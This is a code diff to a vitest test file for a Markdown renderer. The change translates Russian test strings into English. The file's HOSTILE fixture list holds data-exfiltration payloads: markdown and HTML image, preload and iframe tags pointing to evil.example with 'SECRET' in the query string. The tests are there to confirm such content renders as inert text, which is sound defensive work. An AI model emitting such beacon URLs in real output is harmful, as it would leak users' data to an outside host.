@@ -4,7 +4,7 @@ import { describe, expect, it } from "vitest";
 import { Markdown } from "@/components/transcript/item";
 
 const HOSTILE = [
-  "Смотри: ![график](https://evil.example/b.png?d=SECRET)",
+  "Look: ![chart](https://evil.example/b.png?d=SECRET)",
   '<img src="https://evil.example/a.png?d=SECRET">',
   '<link rel="preload" as="image" href="https://evil.example/c.png">',
   '<iframe src="https://evil.example/frame"></iframe>',
@@ -28,14 +28,14 @@ describe.each([false, true])("Markdown (streaming: %s)", (streaming) => {
   });
 
   it("shows an image as its alt and URL, as text", async () => {
-    const { findAllByTestId } = render(<Markdown text="![график](https://evil.example/b.png?d=SECRET)" streaming={streaming} />);
+    const { findAllByTestId } = render(<Markdown text="![chart](https://evil.example/b.png?d=SECRET)" streaming={streaming} />);
     const [image] = await findAllByTestId("image-as-text");
-    expect(image!.textContent).toBe("[изображение: график] https://evil.example/b.png?d=SECRET");
+    expect(image!.textContent).toBe("[image: chart] https://evil.example/b.png?d=SECRET");
     expect(image!.closest("a")).toBeNull();
   });
 
   it("still renders ordinary markdown", async () => {
-    const { findByText } = render(<Markdown text={"**жирный** и `код`"} streaming={streaming} />);
-    expect((await findByText("жирный")).tagName).toMatch(/STRONG|SPAN/);
+    const { findByText } = render(<Markdown text={"**bold** and `code`"} streaming={streaming} />);
+    expect((await findByText("bold")).tagName).toMatch(/STRONG|SPAN/);
   });
 });
